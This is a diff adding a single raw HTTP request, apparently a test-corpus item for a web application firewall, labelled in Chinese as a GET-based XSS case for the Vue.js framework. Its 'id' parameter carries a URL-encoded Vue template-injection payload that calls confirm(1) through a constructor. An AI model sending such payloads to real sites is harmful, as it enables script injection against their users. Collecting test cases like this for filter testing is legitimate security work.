@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_框架_VueJS-06506727
+# 利用 Vue.js 的动态组件绑定和构造函数调用
+GET /?id=%3Cx%20%23%5B_c.constructor%60confirm%281%29%60%28%29%5D%3E&bid=hd_tag_m8mv25fr HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25fr
+RM-PRO-Token: e21cf9348a2881d12d061d15b945133e
+RM-PRO-Time: 1742808465858
+User-Agent: curl/7.83.1
+
